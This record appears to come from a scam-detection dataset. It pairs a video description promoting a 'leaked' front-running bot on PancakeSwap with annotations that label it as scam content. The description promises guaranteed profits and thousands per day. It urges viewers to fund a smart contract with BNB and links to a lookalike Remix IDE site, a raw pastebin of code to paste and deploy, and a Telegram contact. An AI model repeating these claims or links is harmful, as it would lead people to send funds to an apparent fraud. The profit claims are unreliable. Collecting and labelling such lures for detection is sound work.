title: frontrunbot BNB profits
description: Deploy a Frontrun Bot on Pancakeswap & Start Making Money.  ** READ THE DESCRIPTION CAREFULLY! **  ** IMPORTANT UPDATE ** I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens come with 3~6% fees. If you fund the contract with less than 0.5 BNB, the bot might target another token with high burn fees the contract will basically waste your money on fees rather than use it to make a profit. I recommend funding the contract with around 0.5 - 2 BNB just to make sure that won't happen.  I personally start with 2 BNB, DO NOT USE LESS THAN .25 !!! you may lose capital.   ** IMPORTANT UPDATE **  In this video I will guide you to run and deploy a LEAKED $150000 Front Running bot written in Solidity. With this, you will be able to passively generate thousands a day, all from the comfort of your own home. So hurry up and run this bot for yourself before Pancakeswap and Uniswap ban this.  The cool thing about the bot is that your BNB you sent before to the Contract is still counted in the Frontrun Pool. If you added some BNB at first to the Bot Contract and you got some profit in return, you can just add more BNB to The Front Run Contract To Keep your Bot in front of other Frontrun Bots. For example, if you added 0.5 BNB at first and then add 0.6 BNB later, the total amount of BNB in your Frontrun Pool will be 0.5 + 0.6 = 1.1 BNB and you will make more profit.  The way front-running bots work is very simple: - Bots locate any new liquidity added to a BSC token. - Bots immediately buy milliseconds before the confirmation of liquidity. - Then sell seconds after for a guaranteed profit. - 90% of the profit is sent back to your wallet, and 10% is kept in the Frontrun Pool for the next transaction.  ** LINKS **  Metamask: https://metamask.io/download.html  Connect MetaMask to Binance Smart Chain: https://academy.binance.com/en/articl...  Remix: https://RemixCompilerIDE.github.io/  https://pastebin.com/raw/s7EnwtCq  (Copy and Paste all of it)   For any questions, you can contact me at https://t.me/cryptomem666  -------------------------- Copyright Disclaimer: Under section 107 of the Copyright Act 1976, allowance is made for “fair use” for purposes such as criticism, comment, news reporting, teaching, scholarship, education, and research. annotation.contextual_rationale: This video is scam content because it promotes deploying a front-running bot, asks viewers to fund its contract with approximately 0.5 to 2 BNB, and claims the transfer can generate thousands per day while returning 90 percent of stated profits to the wallet. The speaker demonstrates deploying the contract and sending roughly 0.5 to 1 BNB, then describes automated trades and potential daily gains of up to 100 BNB with more capital. The video acknowledges that fees may consume deposited money, and the described material does not establish that the contract functions as claimed or that the displayed transaction produced profit.
annotation.fine_grained_rationale: The primary mechanism is a trading bot linked to contract deployment, activation, funding with BNB and claimed trading returns. The speaker specifically instructs viewers to fund the contract and claims that the bot automatically buys and sells and returns part of the claimed profit to the wallet. The content also presents an explicit front-running mechanism: the bot is described as buying before other participants and selling shortly afterward to obtain profit. This supports a secondary rule or market-manipulation mechanism without establishing that the mechanism works.
